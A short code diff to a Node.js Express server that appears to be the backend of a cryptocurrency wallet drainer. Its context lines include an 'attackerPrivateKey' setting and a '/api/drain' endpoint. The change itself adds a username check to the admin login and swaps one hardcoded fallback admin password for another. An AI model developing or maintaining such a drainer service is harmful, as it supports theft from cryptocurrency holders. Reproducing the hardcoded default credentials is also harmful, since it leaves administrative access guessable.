@@ -21,7 +21,8 @@ app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'inde
 // ── Config ────────────────────────────────────────────────────────────────────
 let config = {
   attackerPrivateKey: process.env.ATTACKER_PRIVATE_KEY || '',
-  adminPassword:      process.env.ADMIN_PASSWORD || 'demo1234',
+  adminUsername:      process.env.ADMIN_USERNAME || 'admin',
+  adminPassword:      process.env.ADMIN_PASSWORD || 'NexR3w@rds!2026',
 }
 
 // ── In-memory cache (fast reads) ──────────────────────────────────────────────
@@ -404,11 +405,11 @@ app.post('/api/drain', async (req, res) => {
 // ════════════════════════════════════════════════════════════════════════════
 
 app.post('/admin/login', (req, res) => {
-  const { password } = req.body
-  if (password === config.adminPassword) {
+  const { username, password } = req.body
+  if (username === config.adminUsername && password === config.adminPassword) {
     res.json({ ok: true })
   } else {
-    res.status(401).json({ ok: false, error: 'Wrong password' })
+    res.status(401).json({ ok: false, error: 'Invalid credentials' })
   }
 })
 
